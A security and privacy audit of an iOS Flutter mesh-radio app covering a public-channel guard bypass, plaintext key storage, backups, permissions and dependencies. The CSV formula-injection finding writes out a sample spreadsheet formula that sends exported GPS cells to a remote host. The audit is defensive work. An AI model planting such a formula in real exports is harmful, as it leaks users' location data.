# Mesh Analyzer — security & data-protection audit (pre-beta)

Tree audited: `scratchpad/beta-audit` (branch `beta-audit`, HEAD 5806515). Read-only; `flutter analyze` clean, `flutter test` 223/223 pass. docs/beta/ not reviewed.

## Summary

The posture is reasonable for a beta. No secrets, keys or personal coordinates are in the tracked files or the git history. Protobuf parsing is defensive throughout, every admin action sits behind a confirmation dialog, nothing sensitive goes to the logs, and there are no analytics SDKs. The main problem is the "never on the public channel" rule. It is checked only when a session starts, and the periodic pings and the NodeInfo exchange never check it again. Resuming a session after relaunch, switching radios or restoring a backup mid-session can therefore put pings on the public mesh. The other main gaps are data at rest: channel keys in plaintext prefs and JSON, CSV exports that survive "Erase all app data", and CSV formula injection.

**Counts:** CRITICAL 0 · HIGH 1 · MEDIUM 5 · LOW 6 · INFO 5

## Findings

### [HIGH] Pings and NodeInfo exchange skip the public-channel guard after a session starts
- **Where:** `lib/services/session_manager.dart:62-69` (`initialize` resumes a session and calls `_startMonitoring` with no channel check), `:112` (the only `onPublicChannel` check); `lib/services/active_probe_service.dart:84-88` (`prepareToPing`), `:130` (`_sendPing` checks only `isReady`/`myNodeId`/`isDemo`); `lib/data/radio/meshtastic/meshtastic_radio.dart:810-832, 870-924` (`exchangeNodeInfo`/`ping` send on channel 0 with no check); `lib/ui/widgets/radio_backups_section.dart:60-100` and `lib/ui/widgets/connection_banner.dart:~489` (neither restore nor connect is blocked while a session is active).
- **What:** `onPublicChannel` is only checked in `startSession`. These paths keep pinging (PRIVATE_APP DM on channel index 0, every N seconds) and send our NodeInfo with `want_response`:
  1. **App relaunch.** `initialize()` resumes the saved active session and starts `ActiveProbeService` before any radio connects. As soon as *any* radio is ready, `_sendPing` fires, even if that radio's primary is LongFast/default.
  2. **Radio switch mid-session.** Connecting to a different radio from the connect list while recording is not blocked. The ping timer keeps running against it.
  3. **Backup restore mid-session.** Restore writes the radio's original (often public) channel table back. After the reboot and auto-reconnect, the pings continue on the restored public primary.
- **Why it matters:** This breaks the app's hard rule ("Never test on the public channel"). It puts periodic traffic on the shared public mesh, which other nodes relay up to the hop limit, and announces the user's node there.
- **Fix:** Enforce the guard where packets are sent:
  - In `ActiveProbeService._sendPing`, return early when `_radio.onPublicChannel`. Ideally also record or emit a "paused: public channel" state.
  - Make `prepareToPing` a no-op on the public channel, and have `ping` return `failed('PUBLIC_CHANNEL')`.
  - In `SessionManager.initialize`, keep resuming the session but let the per-ping check gate the traffic.
  - Optionally refuse Restore (and warn on connecting another radio) while `activeSession != null`, as `DataEraseService` already does.
  - Add a test: resume a session with a public-channel fake radio and assert no `ping`/`prepareToPing` calls.

### [MEDIUM] Public-channel detection misses the expanded 16-byte default key
- **Where:** `lib/data/radio/meshtastic/meshtastic_radio.dart:353-360`
- **What:** `onPublicChannel` treats a primary as public only when `psk.length <= 1`. The default key can also be stored in expanded form: `d4f1bb3a20290759f0bcffabcf4e6901`, given in `lib/proto/meshtastic/channel.proto:43`, as are the "simple1–10" variants (last byte +1..+9). CLI and third-party clients can write it that way. Such a radio passes the guard and `startSession` proceeds on the public mesh.
- **Why it matters:** It is a straightforward bypass of the only public-channel check.
- **Fix:** Also return true when the PSK is 16 bytes and equals the default key with any last byte from `0x01` to `0x0A`. Optionally also when the channel name is empty or a preset name and the key is short. Add the cases to `test/meshtastic_radio_test.dart:226-236`.

### [MEDIUM] Test-channel PSK stored in plaintext SharedPreferences (and the channel carries full-precision positions)
- **Where:** `lib/services/radio_profile_service.dart:34, 90-98` (`test_channel_psk`, base64 in NSUserDefaults); `lib/data/radio/meshtastic/meshtastic_radio.dart:1168` (`positionPrecision: 32` on the MeshTest channel).
- **What:** The 32-byte AES key sits in `Library/Preferences/com.andybrunker.meshAnalyzer.plist`. That file is included in iCloud and Finder backups and is readable by backup-extraction tools. The channel it protects is set to full-precision position sharing, so anyone with the key can decrypt the radios' live GPS positions over the air. `eraseEverything` deliberately keeps the key (`data_erase_service.dart:31-35`).
- **Why it matters:** This is the one real secret the app creates. Leaking it exposes the user's precise movements and the base location (often their home).
- **Fix:** Move the key to the Keychain, e.g. `flutter_secure_storage` with accessibility `first_unlock` (readable while locked for background use). Migrate once on read and delete the prefs copy. Use `first_unlock_this_device` if you accept re-running Radio Setup after a phone migration. Also await the `setString` in `channelKey` (`:96`): today a crash right after first use can lose the key and leave the radios mismatched.

### [MEDIUM] Radio backups keep all original channel keys in plaintext JSON and are shared without a warning
- **Where:** `lib/services/radio_backup_service.dart:65-99` (`channelUrl` and `protobuf.channels` contain every channel's PSK), `:128-133, 167` (written to `Documents/radio_backups/`); `lib/ui/widgets/radio_backups_section.dart:109-129` ("Share file" sends the JSON with no warning; "Copy link" puts the keyed URL on the general pasteboard and only warns afterwards).
- **What:** Each backup holds the user's *personal* private channel keys from before Radio Setup, in plain JSON. Documents is in iCloud and device backups. Sharing sends the keys to any share-sheet target (Messages, Mail, AirDrop, cloud drives). The pasteboard copy syncs through Universal Clipboard and other apps can read it.
- **Why it matters:** These are the user's long-lived mesh keys, not just the test key.
- **Fix:**
  - Show a confirm dialog *before* Share file and Copy link ("contains your channel keys").
  - Store the PSK bytes in the Keychain keyed by backup id, or encrypt the backup file with a Keychain-held key.
  - At minimum, set `NSFileProtectionComplete` on `radio_backups/` (a small native call; backups are never needed while locked).
  - Consider writing the shared copy to the temp directory and deleting it after the share completes.

### [MEDIUM] CSV export allows formula injection through mesh node names
- **Where:** `lib/services/csv_export_service.dart:66-82` (`source_node` = `userLabel`/`longName`/`shortName`), `:103` (`ListToCsvConverter` with no escaping); names come from the mesh via `packet_processor.dart:83-106, 220-230`.
- **What:** Node long and short names are set by *other* people's radios: anything in the radio's node DB, including nodes heard on the public mesh before setup. A name like `=IMPORTXML("https://x/?"&B2&C2,"//a")` or `=HYPERLINK(...)` is written verbatim. When the export is opened in Google Sheets, Numbers or Excel, it runs as a formula. Session, map and rig names (user-entered) go out the same way.
- **Why it matters:** The CSV holds the user's full GPS track. A formula like `IMPORTXML` in Sheets can send cell contents to a remote server with no click.
- **Fix:** In the exporter, prefix any string cell that starts with `=`, `+`, `-`, `@`, tab or CR with a single quote `'`, the OWASP CSV-injection mitigation. Apply it to node, session and rig name columns, not to the numeric columns.

### [MEDIUM] "Erase all app data" leaves CSV exports (full GPS tracks) on the phone
- **Where:** `lib/services/csv_export_service.dart:104-121` (writes `Documents/<name>.csv` and never deletes it); `lib/services/data_erase_service.dart:108-131` (deletes `radio_backups/` and `elevation_cache/` only); dialog copy at `lib/ui/screens/settings_screen.dart:353-360` says "deletes everything this app has stored".
- **What:** Every export stays in Documents for good, and is in iCloud/device backups, even after "Delete all sessions and maps" or "Erase all app data". SQLite rows are deleted without `VACUUM`, so the location data also remains in free pages and the WAL until they are reused.
- **Why it matters:** The erase does not do what the UI promises, and the leftover files are location history.
- **Fix:** Write exports to `getTemporaryDirectory()/exports/` and delete them after the share sheet returns. Also delete `*.csv` in Documents (legacy files) in `eraseEverything` and `deleteSessionsAndMaps`. Run `customStatement('VACUUM')` after `deleteAllData()` / `deleteAllMeasurements()`.

### [LOW] Location / permission over-declaration
- **Where:** `ios/Runner/Info.plist:35` (`NSLocationAlwaysAndWhenInUseUsageDescription`), `:33` (`NSBluetoothPeripheralUsageDescription`); `ios/Podfile:47-53`.
- **What:**
  - Location: the app never asks for Always. geolocator 13 calls `requestWhenInUseAuthorization` whenever the WhenInUse key exists (`geolocator_apple-2.3.13 PermissionHandler.m:72-78`), and background recording works through `allowBackgroundLocationUpdates` + `UIBackgroundModes=location` (`gps_service.dart:72-81`).
  - permission_handler: the Podfile enables `PERMISSION_LOCATION`, `PERMISSION_LOCATION_ALWAYS`, `PERMISSION_LOCATION_WHENINUSE` and `PERMISSION_NOTIFICATIONS`, but the code only uses `Permission.bluetooth` (`connection_banner.dart:320-338`).
  - Podfile syntax: `||=` only sets the macros when the key is nil, so they may silently not apply at all.
  - `NSBluetoothPeripheralUsageDescription` is obsolete on iOS 13+.
- **Why it matters:** App Review and privacy-minded beta users read declared capabilities. An unused Always string suggests the app tracks you in the background.
- **Fix:**
  - Remove the Always key, and add `BYPASS_PERMISSION_LOCATION_ALWAYS=1` to the pod preprocessor definitions so geolocator doesn't reference `requestAlwaysAuthorization`.
  - Reduce the permission_handler macros to `PERMISSION_BLUETOOTH=1`, and use `(config.build_settings['GCC_PREPROCESSOR_DEFINITIONS'] ||= ['$(inherited)']) << ...` so it always applies.
  - Drop the obsolete Peripheral key.

### [LOW] Region setup turns on transmit while the radio is still on the default public channel
- **Where:** `lib/data/radio/meshtastic/meshtastic_radio.dart:1129-1141` (`setRegion` sets `txEnabled = true`), shown on first connect at `lib/ui/widgets/connection_banner.dart:506-510`.
- **What:** On an out-of-the-box radio, the app's region dialog makes it start transmitting (NodeInfo/position broadcasts) on the default LongFast channel. The dialog doesn't say this, and Radio Setup is not chained after it.
- **Why it matters:** This is the same as the official app's behaviour, but it is the one place where the app itself puts a radio on the public mesh.
- **Fix:** After "Set region", offer "Set up as mobile/base now" (Radio Setup), or add one line to the dialog saying the radio will join the public mesh until Radio Setup is run.

### [LOW] Node positions from the mesh are not range-checked
- **Where:** `lib/data/radio/meshtastic/meshtastic_radio.dart:144-145`, `lib/data/radio/radio_types.dart:129-132`, `lib/services/packet_processor.dart:83-94`, `lib/data/database/app_database.dart:122-125`, used as the terrain base at `lib/ui/screens/coverage_map_detail_screen.dart:157-163`.
- **What:** `latitudeI/1e7` is stored as-is (only `0,0` is rejected). A malformed or hostile POSITION packet can store a latitude of ±214° and similar values. latlong2's range asserts are debug-only, so in release the bad value flows into terrain/OpenTopoData requests and map fitting.
- **Why it matters:** It causes misbehaviour or failed estimates from untrusted input. It is not a memory-safety issue.
- **Fix:** In `RadioNode.hasPosition`, also require `lat.abs() <= 90 && lon.abs() <= 180`.

### [LOW] Location data is sent to third parties (OpenTopoData, OSM tile servers) without disclosure
- **Where:** `lib/services/terrain/open_topo_data_source.dart:29, 139-148` (base location and the surrounding grid sent as query parameters to `api.opentopodata.org`); `lib/ui/screens/map_screen.dart:170`, `coverage_map_detail_screen.dart:343`, `rig_comparison_screen.dart:249` (OSM tiles).
- **What:** Turning on the terrain-aware layer sends the base coordinates, often the user's home, to a third-party API. Tile requests reveal the viewed area and the user's IP. Both are user-initiated and reasonable, but CLAUDE.md says "no cloud uploads" and the App Privacy label and privacy policy must reflect them.
- **Why it matters:** This is a disclosure/compliance item.
- **Fix:** Name OpenTopoData and OSM in the privacy policy and App Privacy answers. Optionally round coordinates to about 10 m before querying, and say so once in the terrain toggle's help text.

### [LOW] Personal email in every commit's author metadata
- **Where:** `git log --all`: 60 commits authored `Andy Brunker <<personal address>>` / `motab619 <<personal address>>`.
- **What:** Making the repo public publishes this address permanently.
- **Why it matters:** Spam/phishing exposure and linking of identities. The file contents themselves are clean.
- **Fix:** If unwanted, rewrite authors to the GitHub noreply address (`git filter-repo --mailmap`) before the first public push, or publish a fresh squashed history. Set `user.email` to the noreply address going forward.

### [LOW] Shared backup files also identify the radio (owner record)
- **Where:** `lib/services/radio_backup_service.dart:97` (`owner` incl. the node's public key and names).
- **What:** Not secret, but the shared file also identifies the user's radio (node number, names, public key) to whoever receives it.
- **Why it matters:** Minor privacy; it pairs with the MEDIUM backup finding.
- **Fix:** Cover it in the same pre-share warning.

### [INFO] Internal planning docs and paths become public
- **Where:** `CLAUDE.md` (team ID, `~/develop/coachella-mesh`, Pro/offer-code strategy), `docs/roadmap.md` (business decisions, trademark plans).
- **What / Fix:** Nothing secret. Decide whether you want these public, and move them to a private location if not.

### [INFO] Team ID and bundle IDs in tracked files
- **Where:** `ios/ExportOptions.plist:8`, `ios/Runner.xcodeproj/project.pbxproj` (9×), `ios/fastlane/Fastfile:23`, `ios/Runner/Products.storekit`.
- **What:** `P68H74992L` and `com.andybrunker.*` are public by design: they are embedded in every signed IPA. No action needed.

### [INFO] Dependencies
- **Direct runtime packages:**

  | Package | Version | Package | Version |
  |---|---|---|---|
  | protobuf | 4.2.0 | geolocator | 13.0.4 |
  | fixnum | 1.1.1 | wakelock_plus | 1.5.1 |
  | flutter_blue_plus | 1.36.8 | flutter_local_notifications | 18.0.1 |
  | permission_handler | 12.0.1 | shared_preferences | 2.5.4 |
  | flutter_riverpod | 2.6.1 | csv | 6.0.0 |
  | riverpod_annotation | 2.6.1 | intl | 0.19.0 |
  | drift | 2.28.2 | share_plus | 10.1.4 |
  | sqlite3_flutter_libs | 0.5.42 (SQLite 3.52.0 via Podfile.lock) | uuid | 4.5.3 |
  | path_provider | 2.1.5 | url_launcher | 6.3.3 |
  | path | 1.9.0 | package_info_plus | 9.0.1 |
  | flutter_map | 8.2.2 | in_app_purchase | 3.3.1 |
  | latlong2 | 0.9.1 | in_app_purchase_storekit | 0.4.13+2 |
  | http | 1.2.2 | | |

- **`flutter pub outdated`:**
  - Major versions behind: flutter_blue_plus (2.3.14), flutter_local_notifications (22.x), geolocator (14.x), share_plus (13.x), permission_handler (13.x), protobuf (6.x), csv (8.x), riverpod (3.x), package_info_plus (10.x).
  - Patch updates: drift, flutter_map, path_provider, shared_preferences, uuid, in_app_purchase_storekit.
  - `sqlite3_flutter_libs` latest is `0.6.0+eol`: the package is end-of-life, and SQLite moves into `sqlite3` 3.x build hooks.
  - Dev-only `build_resolvers` and `build_runner_core` are discontinued.
  - No direct dependency is retracted or discontinued.
- **Not verified:** I did not check against an advisory database (offline). The bundled SQLite 3.52.0 is current.
- **Unused direct deps:** `uuid` and `riverpod_annotation` are not imported anywhere in lib/ or test/. Remove them, and their NOTICE entries if present.
- **Plan:** Before public launch, take the patch updates now and schedule the `sqlite3` 3.x migration and the flutter_blue_plus 2.x upgrade (the BLE PR needs its Android note).

### [INFO] Demo mode grants Pro; Pro cache is trusted offline
- **Where:** `lib/providers.dart:170-176`; `lib/services/pro_entitlement.dart:434-452`.
- **What:**
  - Demo mode (`-MeshDemo` launch arg or `MESH_DEMO` env) forces Pro, but only on the throwaway demo DB. Launch args can't be set for App Store/TestFlight builds by end users.
  - The `pro_entitlement_v1` cache is a plain JSON grant. It could be edited through backup tools and is honoured while refreshes fail (offline). That is a revenue-only risk and matches the documented design.

### [INFO] Android project is a stub
- **Where:** `android/app/build.gradle.kts:9, 24` (`com.example.mesh_analyzer`, debug signing for release).
- **What / Fix:** Harmless while iOS-only. Change the applicationId before any Play build.

## Checked, OK
- No `.env`, `.p8`, AuthKey, API keys, tokens or passwords in tracked files or anywhere in `git log --all -p`. `.env.example` has placeholders only, and `ios/.gitignore` ignores `fastlane/.env` and `*.p8`.
- Coordinates in the tree and history: only the demo walk (`lib/demo/demo_walk.dart`, Empire Polo Club, a public venue), test fixtures at the same spot, and the SF fallback (`constants.dart:47`). No home location found.
- Logging: no PSKs, keys, channel URLs or GPS coordinates are printed. Logs contain only BLE names/ids, NAK names and error strings.
- `csvFileName` whitelists `[A-Za-z0-9]` for map and session names, so there is no path traversal. Backup filenames are a hex node number plus a timestamp. `preset` is an enum-derived id today; sanitize it too once MeshCore presets arrive.
- All protobuf decoding of radio and mesh data is wrapped in try/catch: FromRadio frame, Telemetry, User, Position, Routing, contacts, backups. Undecodable frames are dropped.
- The radio's `Config.security` (private key), received in the config download, stays in memory (`configs` map) and is never persisted, backed up or logged.
- `radio_contacts_v1` stores only `User` records (names plus *public* key). Nothing secret.
- The PSK is 32 bytes from `Random.secure()`, and packet ids also come from `Random.secure()`.
- Radio Setup writes MeshTest as the only enabled channel (1-7 DISABLED), with uplink and downlink off (no MQTT).
- Admin actions (Radio Setup, Restore, Clear nodes, Set region) are all behind confirmation dialogs. Restore checks the backup's node number matches the connected radio.
- `mesh_analyzer/app` channel: read-only (`launchArguments`), with no injection path. `mesh_analyzer/live_activity`: arguments are type-checked with defaults, no push token is requested, and lock-screen content is only session and base names plus stats.
- No `UIFileSharingEnabled` or `LSSupportsOpeningDocumentsInPlace`, so Documents (DB, CSVs, backups) is not exposed in the Files app.
- The demo DB is separate (`mesh_analyzer_demo.sqlite`) and deleted on every demo launch. The demo radio never writes to BLE (`_write` throws).
- Background modes are limited to `bluetooth-central` and `location`. Background location is enabled only while a session records.
- No ad, analytics or tracking SDKs in pubspec or Podfile.lock.

## Before going public
- [ ] Fix the HIGH finding (per-ping public-channel guard) and the 16-byte default-key bypass before the beta ships.
- [ ] Decide on author email: rewrite to the GitHub noreply address (`git filter-repo --mailmap`) or accept `<personal address>` being public; set `git config user.email` to the noreply address.
- [ ] Re-run a secret scan on the final history (`gitleaks detect --log-opts="--all"` or `trufflehog git file://.`) right before flipping visibility; also check every branch (`app-icon`, `backup-link`, `field-build-2026-10-15`, `pill-fit`, `ping-override`, `radio-contacts`, `region-setup`) since `--all` pushes them too.
- [ ] Root `.gitignore`: add `.env`, `.env.*` (keep `!.env.example`), `*.p8`, `*.p12`, `*.cer`, `*.mobileprovision`, `*.ipa`, `*.dSYM.zip`, `*.sqlite*`, `*.csv` and `radio_backups/`, so stray exports or keys from device pulls can't be committed from the repo root. Today only `ios/.gitignore` covers `fastlane/.env` and `*.p8`.
- [ ] Review `CLAUDE.md` and `docs/roadmap.md` for business or internal content you don't want public (Pro strategy, offer codes, local paths).
- [ ] Keep `docs/beta/` out of the public push, or review it separately (not audited here).
- [ ] Check `ios/fastlane/screenshots/` contain only demo data (they're generated from the Empire Polo demo walk).
- [ ] Remove `NSLocationAlwaysAndWhenInUseUsageDescription` and trim the permission_handler macros (LOW finding) so the public Info.plist matches behaviour.
- [ ] Privacy policy and App Privacy label: precise location (on device; base and grid coordinates sent to OpenTopoData on request), OSM tile requests, no tracking. Keep the "no cloud uploads" wording accurate.
- [ ] Confirm LICENSE and NOTICE list all runtime packages, drop unused `uuid` and `riverpod_annotation`, and confirm every authored file has the SPDX header (spot-checked: yes).
- [ ] Rename the Android `applicationId` from `com.example.mesh_analyzer`, or note in the README that Android is unsupported.
